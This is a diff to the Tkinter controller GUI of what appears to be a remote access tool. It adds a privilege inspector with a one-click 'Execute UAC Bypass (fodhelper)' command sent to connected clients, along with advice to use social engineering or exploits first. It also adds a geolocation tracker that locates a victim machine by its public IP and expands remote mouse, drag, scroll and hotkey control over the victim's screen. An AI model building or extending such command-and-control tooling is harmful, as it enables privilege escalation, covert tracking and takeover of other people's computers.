@@ -1270,6 +1270,280 @@ def open_file_editor(filepath, encoding, content):
     win.protocol("WM_DELETE_WINDOW", close_editor)
 
 
+# ── Privilege Info & UAC Bypass ───────────────────────────────────────────────
+
+def request_privilege_info():
+    """Send PRIV_INFO command to active client."""
+    if not g.active_client_id:
+        messagebox.showerror("No Client", "Please select a client first!")
+        return
+    import gui_commands as cmds
+    threading.Thread(target=cmds.execute_command,
+                     args=("PRIV_INFO", "Get Privilege Info"), daemon=True).start()
+
+
+def show_privilege_window(data):
+    """Display a privilege info + UAC bypass window."""
+    integrity  = data.get("integrity", "Unknown")
+    user       = data.get("user", "N/A")
+    is_admin   = data.get("is_admin", False)
+    uac_on     = data.get("uac_enabled", False)
+    elevated   = data.get("elevated", False)
+    os_name    = data.get("os", "Windows")
+
+    # Colour theme by integrity
+    badge_colors = {
+        "Low":    ("#EF5350", "🔴"),
+        "Medium": ("#FFA726", "🟡"),
+        "High":   ("#66BB6A", "🟢"),
+        "System": ("#29B6F6", "🔵"),
+        "Root":   ("#29B6F6", "🔵"),
+        "User":   ("#FFA726", "🟡"),
+    }
+    badge_bg, badge_icon = badge_colors.get(integrity, ("#90A4AE", "⚪"))
+
+    win = tk.Toplevel(g.root)
+    win.title("👑 Privilege Info")
+    win.geometry("500x480")
+    win.configure(bg="#0D0D1A")
+    win.resizable(False, False)
+
+    # ── Header ─────────────────────────────────────────────────────────────────
+    hdr = tk.Frame(win, bg="#1A0A2E", height=65)
+    hdr.pack(fill="x")
+    hdr.pack_propagate(False)
+    tk.Label(hdr, text="👑  PRIVILEGE INSPECTOR", font=("Segoe UI", 13, "bold"),
+             bg="#1A0A2E", fg="#00E5FF").pack(side="left", padx=20, pady=15)
+
+    badge = tk.Label(hdr, text=f"{badge_icon} {integrity.upper()}",
+                     font=("Segoe UI", 11, "bold"),
+                     bg=badge_bg, fg="white", padx=14, pady=4)
+    badge.pack(side="right", padx=20, pady=17)
+
+    # ── Info Cards ─────────────────────────────────────────────────────────────
+    body = tk.Frame(win, bg="#0D0D1A")
+    body.pack(fill="both", expand=True, padx=20, pady=15)
+
+    rows = [
+        ("👤 Username",       user),
+        ("💻 OS",             os_name),
+        ("🛡️ Admin Group",    "Yes ✅" if is_admin else "No ❌"),
+        ("🔒 UAC Enabled",    "Yes (ON)" if uac_on else "No (OFF)"),
+        ("🔑 Token Integrity", f"{badge_icon} {integrity}"),
+        ("⚡ Elevated",       "Yes — HIGH token ✅" if elevated else "No — MEDIUM token ⚠️"),
+    ]
+
+    for label, value in rows:
+        row = tk.Frame(body, bg="#131325", height=44)
+        row.pack(fill="x", pady=3)
+        row.pack_propagate(False)
+        tk.Label(row, text=label, font=("Segoe UI", 10, "bold"),
+                 bg="#131325", fg="#78909C", width=18, anchor="w").pack(side="left", padx=12)
+        tk.Label(row, text=value, font=("Segoe UI", 11),
+                 bg="#131325", fg="#E0E0E0", anchor="w").pack(side="left", padx=5)
+
+    # ── UAC Bypass Panel ───────────────────────────────────────────────────────
+    sep = tk.Frame(body, bg="#2A2A4A", height=2)
+    sep.pack(fill="x", pady=12)
+
+    if elevated:
+        tk.Label(body, text="✅  Already running as HIGH integrity — no bypass needed.",
+                 font=("Segoe UI", 10), bg="#0D0D1A", fg="#66BB6A").pack(pady=8)
+    elif not is_admin:
+        tk.Label(body, text="❌  Not in admin group — bypass impossible.\n    Need social engineering or exploit first.",
+                 font=("Segoe UI", 10), bg="#0D0D1A", fg="#EF5350", justify="left").pack(pady=8)
+    else:
+        tk.Label(body, text="⚡  Admin in group but MEDIUM integrity (UAC blocking)\n    → fodhelper.exe bypass available!",
+                 font=("Segoe UI", 10), bg="#0D0D1A", fg="#FFA726", justify="left").pack(pady=(0, 10))
+
+        def do_bypass():
+            bypass_btn.config(state="disabled", text="⏳ Bypassing...")
+            import gui_commands as cmds
+            threading.Thread(target=cmds.execute_command,
+                             args=("UAC_BYPASS", "UAC Bypass"), daemon=True).start()
+            win.after(3000, lambda: bypass_btn.config(state="normal",
+                                                       text="🔥 Execute UAC Bypass (fodhelper)"))
+
+        bypass_btn = tk.Button(
+            body,
+            text="🔥 Execute UAC Bypass (fodhelper)",
+            command=do_bypass,
+            font=("Segoe UI", 12, "bold"),
+            bg="#B71C1C", fg="white",
+            activebackground="#D32F2F",
+            relief="flat", padx=20, pady=12, cursor="hand2"
+        )
+        bypass_btn.pack(fill="x")
+
+    win.protocol("WM_DELETE_WINDOW", win.destroy)
+
+
+# ── GeoLocation ───────────────────────────────────────────────────────────────
+
+def show_geolocation():
+    """Fetch and display GeoLocation info for the active client's IP address."""
+    if not g.active_client_id:
+        messagebox.showerror("No Client", "Please select a client first!")
+        return
+
+    # Get the client's IP
+    with g.clients_lock:
+        if g.active_client_id not in g.clients:
+            messagebox.showerror("Error", "Client not found!")
+            return
+        client_ip = g.clients[g.active_client_id]["addr"][0]
+
+    # Singleton check
+    if g.geo_window and g.geo_window.winfo_exists():
+        g.geo_window.lift()
+        g.geo_window.focus_force()
+        return
+
+    # ── Create Window ──────────────────────────────────────────────────────────
+    win = tk.Toplevel(g.root)
+    win.title("🗺️ GeoLocation Tracker")
+    win.geometry("600x620")
+    win.configure(bg="#0D0D1A")
+    win.resizable(False, False)
+    g.geo_window = win
+
+    def on_close():
+        g.geo_window = None
+        win.destroy()
+    win.protocol("WM_DELETE_WINDOW", on_close)
+
+    # ── Header ─────────────────────────────────────────────────────────────────
+    hdr = tk.Frame(win, bg="#1A0A2E", height=70)
+    hdr.pack(fill="x")
+    hdr.pack_propagate(False)
+    tk.Label(hdr, text="🗺️  GEOLOCATION TRACKER", font=("Segoe UI", 14, "bold"),
+             bg="#1A0A2E", fg="#00E5FF").pack(side="left", padx=20, pady=15)
+    ip_badge = tk.Label(hdr, text=f"🌐 {client_ip}", font=("Segoe UI", 11, "bold"),
+                        bg="#00BCD4", fg="white", padx=12, pady=4)
+    ip_badge.pack(side="right", padx=20, pady=18)
+
+    # ── Loading spinner text ───────────────────────────────────────────────────
+    body = tk.Frame(win, bg="#0D0D1A")
+    body.pack(fill="both", expand=True, padx=20, pady=15)
+
+    loading_lbl = tk.Label(body, text="⏳  Fetching location data...",
+                            font=("Segoe UI", 13), bg="#0D0D1A", fg="#90A4AE")
+    loading_lbl.pack(pady=60)
+
+    # ── Fetch geo data in background ───────────────────────────────────────────
+    def fetch_geo():
+        import urllib.request, json as _json
+
+        def is_private(ip):
+            """Return True if IP is localhost or RFC-1918 private."""
+            return (ip.startswith("127.") or ip.startswith("10.") or
+                    ip.startswith("192.168.") or ip == "::1" or
+                    any(ip.startswith(f"172.{i}.") for i in range(16, 32)))
+
+        try:
+            lookup_ip = client_ip
+            display_ip = client_ip
+
+            # If private/localhost → fetch actual public IP of the client machine
+            if is_private(client_ip):
+                try:
+                    pub_resp = urllib.request.urlopen(
+                        "https://api.ipify.org?format=json", timeout=5)
+                    pub_data = _json.loads(pub_resp.read().decode())
+                    lookup_ip = pub_data.get("ip", client_ip)
+                    display_ip = f"{client_ip}  →  Public: {lookup_ip}"
+                    # Update IP badge on main thread
+                    g.root.after(0, lambda d=display_ip: ip_badge.config(text=f"🌐 {d}"))
+                except Exception:
+                    pass  # Fall through with original IP
+
+            url = (f"http://ip-api.com/json/{lookup_ip}"
+                   f"?fields=status,message,country,regionName,city,zip,"
+                   f"lat,lon,isp,org,as,query,timezone,mobile,proxy,hosting")
+            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=8) as resp:
+                data = _json.loads(resp.read().decode())
+
+            if data.get("status") == "success":
+                g.root.after(0, lambda: show_geo_result(data))
+            else:
+                msg = data.get("message", "Unknown error")
+                g.root.after(0, lambda m=msg: show_geo_error(
+                    f"API Error: {m}\n(IP: {lookup_ip})"))
+        except Exception as e:
+            g.root.after(0, lambda err=str(e): show_geo_error(f"Network Error: {err}"))
+
+    def show_geo_error(msg):
+        if not win.winfo_exists(): return
+        loading_lbl.config(text=f"❌ {msg}", fg="#EF5350")
+
+    def show_geo_result(d):
+        if not win.winfo_exists(): return
+        loading_lbl.destroy()
+
+        # ── Info Cards ─────────────────────────────────────────────────────────
+        fields = [
+            ("🌍 Country",      d.get("country", "N/A")),
+            ("🏙️ Region/City",  f"{d.get('regionName','N/A')} / {d.get('city','N/A')}"),
+            ("📮 ZIP Code",     d.get("zip", "N/A")),
+            ("📍 Coordinates",  f"{d.get('lat','N/A')}°N, {d.get('lon','N/A')}°E"),
+            ("🕐 Timezone",     d.get("timezone", "N/A")),
+            ("📡 ISP",          d.get("isp", "N/A")),
+            ("🏢 Organization", d.get("org", "N/A")),
+            ("📶 Mobile Data",  "Yes ✅" if d.get("mobile") else "No ❌"),
+            ("🔒 Proxy/VPN",    "Detected ⚠️" if d.get("proxy") else "Not Detected ✅"),
+            ("🖥️ Datacenter",   "Yes (Hosting) ⚠️" if d.get("hosting") else "No ✅"),
+        ]
+
+        for label, value in fields:
+            row = tk.Frame(body, bg="#131325", relief="flat")
+            row.pack(fill="x", pady=3, ipady=8, ipadx=10)
+            row.pack_propagate(False)
+            row.configure(height=42)
+
+            tk.Label(row, text=label, font=("Segoe UI", 10, "bold"),
+                     bg="#131325", fg="#78909C", width=18, anchor="w").pack(side="left", padx=12)
+            tk.Label(row, text=value, font=("Segoe UI", 11),
+                     bg="#131325", fg="#E0E0E0", anchor="w").pack(side="left", padx=5)
+
+        # ── Proxy/VPN Warning ──────────────────────────────────────────────────
+        if d.get("proxy") or d.get("hosting"):
+            warn = tk.Label(body, text="⚠️  VPN / Proxy / Hosting detected — location may be inaccurate",
+                            font=("Segoe UI", 9, "italic"), bg="#0D0D1A", fg="#FFA726")
+            warn.pack(pady=(8, 0))
+
+        # ── Buttons ────────────────────────────────────────────────────────────
+        btn_frame = tk.Frame(body, bg="#0D0D1A")
+        btn_frame.pack(pady=18)
+
+        lat, lon = d.get("lat"), d.get("lon")
+        maps_url = f"https://www.google.com/maps?q={lat},{lon}&z=12"
+
+        def open_in_maps():
+            import webbrowser
+            webbrowser.open(maps_url)
+
+        def copy_coords():
+            coords = f"{lat}, {lon}"
+            win.clipboard_clear()
+            win.clipboard_append(coords)
+            messagebox.showinfo("Copied", f"Coordinates copied:\n{coords}")
+
+        map_btn = tk.Button(btn_frame, text="🗺️  Open in Google Maps",
+                            command=open_in_maps,
+                            font=("Segoe UI", 11, "bold"), bg="#00897B", fg="white",
+                            relief="flat", padx=20, pady=10, cursor="hand2")
+        map_btn.pack(side="left", padx=8)
+
+        copy_btn = tk.Button(btn_frame, text="📋  Copy Coords",
+                             command=copy_coords,
+                             font=("Segoe UI", 11, "bold"), bg="#3949AB", fg="white",
+                             relief="flat", padx=20, pady=10, cursor="hand2")
+        copy_btn.pack(side="left", padx=8)
+
+    threading.Thread(target=fetch_geo, daemon=True).start()
+
+
 # ── Live Screen Monitor ───────────────────────────────────────────────────────
 
 import time
@@ -1388,80 +1662,153 @@ def request_screen_monitor():
     win.remote_resolution = "1024x768"
     win.last_frame_time = time.time()
 
-    def on_canvas_click(event, btn_type):
-        if win.current_img is None or not g.active_client_id:
-            return
+    # ── Shared helpers ────────────────────────────────────────────────────────
+    def _send_mouse_cmd(cmd_str):
+        """Send a mouse/keyboard command to active client in a background thread."""
+        def _send():
+            try:
+                with g.clients_lock:
+                    if g.active_client_id in g.clients:
+                        g.clients[g.active_client_id]["conn"].send(cmd_str.encode())
+            except Exception:
+                pass
+        threading.Thread(target=_send, daemon=True).start()
+
+    def _calc_remote_coords(event):
+        """Convert canvas event coordinates to remote screen coordinates."""
+        if win.current_img is None:
+            return None, None
         cw = canvas.winfo_width()
         ch = canvas.winfo_height()
         img_w, img_h = win.current_img.size
-
         if win.scale_to_window.get():
             ratio = min(cw / img_w, ch / img_h)
             display_w = int(img_w * ratio)
             display_h = int(img_h * ratio)
         else:
-            display_w = img_w
-            display_h = img_h
-
+            display_w, display_h = img_w, img_h
         offset_x = (cw - display_w) // 2
         offset_y = (ch - display_h) // 2
+        if not (offset_x <= event.x < offset_x + display_w and
+                offset_y <= event.y < offset_y + display_h):
+            return None, None
+        ix, iy = event.x - offset_x, event.y - offset_y
+        rx = int(ix * (img_w / display_w))
+        ry = int(iy * (img_h / display_h))
+        try:
+            orig_w, orig_h = map(int, win.remote_resolution.split("x"))
+            rx = int(rx * (orig_w / img_w))
+            ry = int(ry * (orig_h / img_h))
+        except Exception:
+            pass
+        return rx, ry
 
-        if offset_x <= event.x < offset_x + display_w and offset_y <= event.y < offset_y + display_h:
-            ix = event.x - offset_x
-            iy = event.y - offset_y
-            rx = int(ix * (img_w / display_w))
-            ry = int(iy * (img_h / display_h))
+    # ── Mouse Click / Drag / Scroll ───────────────────────────────────────────
+    _drag_moved = [False]
 
-            try:
-                orig_w, orig_h = map(int, win.remote_resolution.split("x"))
-                rx = int(rx * (orig_w / img_w))
-                ry = int(ry * (orig_h / img_h))
-            except Exception:
-                pass
+    def on_btn_press(event):
+        """Mouse button pressed — start of potential drag."""
+        _drag_moved[0] = False
+        if not g.active_client_id:
+            return
+        rx, ry = _calc_remote_coords(event)
+        if rx is not None:
+            _send_mouse_cmd(f"MOUSE_PRESS:{rx}:{ry}")
 
-            cmd = f"MOUSE_CLICK:{rx}:{ry}:{btn_type}"
-            def send_click():
-                try:
-                    with g.clients_lock:
-                        if g.active_client_id in g.clients:
-                            conn = g.clients[g.active_client_id]["conn"]
-                            conn.send(cmd.encode())
-                except Exception:
-                    pass
-            threading.Thread(target=send_click, daemon=True).start()
+    def on_btn_release(event):
+        """Mouse button released — send click if no drag occurred, else release."""
+        if not g.active_client_id:
+            return
+        rx, ry = _calc_remote_coords(event)
+        if rx is not None:
+            if not _drag_moved[0]:
+                _send_mouse_cmd(f"MOUSE_CLICK:{rx}:{ry}:left")
+            else:
+                _send_mouse_cmd(f"MOUSE_RELEASE:{rx}:{ry}")
+        _drag_moved[0] = False
 
-    canvas.bind("<Button-1>", lambda e: on_canvas_click(e, "left"))
-    canvas.bind("<Button-3>", lambda e: on_canvas_click(e, "right"))
-    canvas.bind("<Double-Button-1>", lambda e: on_canvas_click(e, "double"))
+    def on_btn_drag(event):
+        """Mouse moved while button held — drag in progress."""
+        if not g.active_client_id:
+            return
+        _drag_moved[0] = True
+        rx, ry = _calc_remote_coords(event)
+        if rx is not None:
+            _send_mouse_cmd(f"MOUSE_DRAG:{rx}:{ry}")
+
+    def on_right_click(event):
+        if not g.active_client_id:
+            return
+        rx, ry = _calc_remote_coords(event)
+        if rx is not None:
+            _send_mouse_cmd(f"MOUSE_CLICK:{rx}:{ry}:right")
+
+    def on_double_click(event):
+        if not g.active_client_id:
+            return
+        rx, ry = _calc_remote_coords(event)
+        if rx is not None:
+            _send_mouse_cmd(f"MOUSE_CLICK:{rx}:{ry}:double")
+
+    def on_scroll(event, direction=None):
+        """Mouse wheel scroll — send scroll delta to client."""
+        if not g.active_client_id:
+            return
+        if direction == "up":
+            delta = 3
+        elif direction == "down":
+            delta = -3
+        else:
+            # Windows: event.delta is +/-120 per notch
+            delta = event.delta // 40 if event.delta else 0
+        if delta != 0:
+            _send_mouse_cmd(f"MOUSE_SCROLL:{delta}")
+
+    # Bind all mouse events
+    canvas.bind("<ButtonPress-1>",   on_btn_press)
+    canvas.bind("<ButtonRelease-1>", on_btn_release)
+    canvas.bind("<B1-Motion>",       on_btn_drag)
+    canvas.bind("<Button-3>",        on_right_click)
+    canvas.bind("<Double-Button-1>", on_double_click)
+    canvas.bind("<MouseWheel>",      on_scroll)               # Windows
+    canvas.bind("<Button-4>", lambda e: on_scroll(e, "up"))   # Linux scroll up
+    canvas.bind("<Button-5>", lambda e: on_scroll(e, "down")) # Linux scroll down
 
     def on_key_press(event):
+        """Send key press to remote client. Supports Ctrl+key hotkeys and special keys."""
         if not g.active_client_id:
             return
         key_name = event.keysym
-        mapping = {
-            "Return": "Key.enter",
+        ctrl_held  = bool(event.state & 0x4)
+        shift_held = bool(event.state & 0x1)
+
+        special_keys = {
+            "Return":    "Key.enter",
             "BackSpace": "Key.backspace",
-            "Tab": "Key.tab",
-            "Escape": "Key.esc",
-            "space": " ",
-            "Delete": "Key.delete",
-            "Up": "Key.up",
-            "Down": "Key.down",
-            "Left": "Key.left",
-            "Right": "Key.right",
+            "Tab":       "Key.tab",
+            "Escape":    "Key.esc",
+            "space":     " ",
+            "Delete":    "Key.delete",
+            "Up":        "Key.up",
+            "Down":      "Key.down",
+            "Left":      "Key.left",
+            "Right":     "Key.right",
+            "Home":      "Key.home",
+            "End":       "Key.end",
+            "Prior":     "Key.page_up",    # Page Up
+            "Next":      "Key.page_down",  # Page Down
+            "F1":  "Key.f1",  "F2":  "Key.f2",  "F3":  "Key.f3",  "F4":  "Key.f4",
+            "F5":  "Key.f5",  "F6":  "Key.f6",  "F7":  "Key.f7",  "F8":  "Key.f8",
+            "F9":  "Key.f9",  "F10": "Key.f10", "F11": "Key.f11", "F12": "Key.f12",
         }
-        key_val = mapping.get(key_name, key_name)
-        if len(key_val) == 1 or key_val.startswith("Key."):
-            cmd = f"KEY_PRESS:{key_val}"
-            def send_key():
-                try:
-                    with g.clients_lock:
-                        if g.active_client_id in g.clients:
-                            conn = g.clients[g.active_client_id]["conn"]
-                            conn.send(cmd.encode())
-                except Exception:
-                    pass
-            threading.Thread(target=send_key, daemon=True).start()
+
+        if ctrl_held and len(key_name) == 1:
+            # Ctrl+letter hotkey  (e.g. Ctrl+C, Ctrl+V, Ctrl+Z, Ctrl+A)
+            _send_mouse_cmd(f"KEY_PRESS:ctrl+{key_name.lower()}")
+        elif key_name in special_keys:
+            _send_mouse_cmd(f"KEY_PRESS:{special_keys[key_name]}")
+        elif len(key_name) == 1:
+            _send_mouse_cmd(f"KEY_PRESS:{key_name}")
 
     win.bind("<Key>", on_key_press)
 
